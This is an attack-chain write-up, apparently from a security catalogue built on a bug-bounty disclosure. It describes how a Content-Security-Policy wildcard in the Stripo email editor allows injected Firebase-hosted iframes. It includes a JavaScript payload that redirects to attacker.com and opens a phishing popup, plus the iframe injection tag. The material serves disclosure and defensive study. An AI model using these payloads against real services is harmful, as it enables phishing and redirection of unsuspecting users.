---
id: ac-stripo-csp-iframe-injection
tags:
  - csp-bypass
  - iframe-injection
  - open-redirect
  - phishing
  - web-vulnerability
type: attack_chain
tools:
  - '[[tools/Node.js]]'
  - '[[tools/Firebase-Hosting]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T12:00:00Z'
procedures:
  - '[[procedures/Create-New-HTML-Email-Template-in-Stripo]]'
  - '[[procedures/Deploy-Malicious-Page-on-Firebase-Hosting]]'
  - '[[procedures/Inject-Malicious-Iframe-into-Template]]'
  - '[[procedures/Trigger-Iframe-Load-for-Redirect-and-Popup]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:33.504Z'
description: >-
  A multi-stage attack exploiting a misconfigured Content-Security-Policy in
  Stripo's email template editor to inject malicious iframes from Firebase
  Hosting, leading to open redirects and phishing popups.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# CSP Misconfiguration Enabling Iframe Injection and Open Redirects in Stripo Email Editor

Multi-stage attack chain demonstrating exploitation of a Content-Security-Policy (CSP) misconfiguration in the Stripo email template editor, allowing arbitrary iframe sources from *.firebaseapp.com. This enables attackers to embed malicious content hosted on free Firebase platforms, resulting in open redirects, phishing popups, and disruption of the editing process.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Template] --> B[Deploy Malicious Page]
    B --> C[Inject Iframe]
    C --> D[Trigger Load and Exploit]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Node.js]]
- [[tools/Firebase-Hosting]]

### Target Environment

- Web platform
- Access to Stripo email template editor (https://my.stripo.email)
- No specific ports required; operates over HTTPS

### Initial Access Requirements

- Valid Stripo account (free tier sufficient)
- Firebase account for hosting (free)
- Browser with JavaScript enabled (e.g., Chrome)
- Network access to Stripo and Firebase services

## Detailed Attack Procedures

### Step 1: Create New HTML Email Template
procedure: [[procedures/Create-New-HTML-Email-Template-in-Stripo]]

**Objective**: Gain access to the HTML editor in Stripo to prepare for iframe injection.

**Instructions**: Log in to Stripo and navigate to the template editor to start a new HTML-based template.

**Expected Output**: An open HTML editor interface ready for content insertion.

**Success Indicators**:
- Template editor loads without errors
- HTML source view is accessible

### Step 2: Deploy Malicious Page on Firebase Hosting
procedure: [[procedures/Deploy-Malicious-Page-on-Firebase-Hosting]]

**Objective**: Host a malicious HTML page on Firebase that executes JavaScript for redirects and popups when loaded in an iframe.

**Instructions**: Use Node.js to initialize and deploy a simple static site to Firebase Hosting. Create an index.html with payload like `<script>alert(123); top.location='https://www.attacker.com'; window.open('https://phish-site.com', '_blank');</script>`.

**Expected Output**: Deployed site accessible at a URL like https://hackerone-jm.firebaseapp.com.

**Success Indicators**:
- Site deploys successfully
- Page loads and executes JavaScript in a test browser

### Step 3: Inject Malicious Iframe into Template
procedure: [[procedures/Inject-Malicious-Iframe-into-Template]]

**Objective**: Embed the iframe pointing to the malicious Firebase page into the email template's HTML.

**Instructions**: In the Stripo HTML editor, insert the payload `<iframe src="//hackerone-jm.firebaseapp.com"></iframe>` into the template content.

**Expected Output**: Iframe tag added to the HTML source without validation errors.

**Success Indicators**:
- HTML saves without CSP blocking the iframe src
- Preview shows the iframe placeholder

### Step 4: Trigger Iframe Load for Redirect and Popup
procedure: [[procedures/Trigger-Iframe-Load-for-Redirect-and-Popup]]

**Objective**: Save or preview the template to load the iframe, executing the malicious JavaScript for redirects and phishing popups.

**Instructions**: Save the template or use the preview function; the iframe will load the Firebase content, assuming browser popup and redirect policies allow it from the Stripo domain.

**Expected Output**: Popup window opens to phishing site; top-level redirect to attacker-controlled domain.

**Success Indicators**:
- JavaScript executes (e.g., alert fires)
- Redirect occurs or popup spawns
- Template viewer at https://viewstripo.email/ reflects the exploit

## Attack Chain Summary

### Key Achievements

1. Bypassed CSP frame-src wildcard to allow arbitrary Firebase iframes
2. Achieved open redirects and phishing popups targeting template viewers
3. Demonstrated usability disruption in the editor without JS disable

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Drive-by Compromise]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---

*Last updated: 2023-10-01T12:00:00Z*
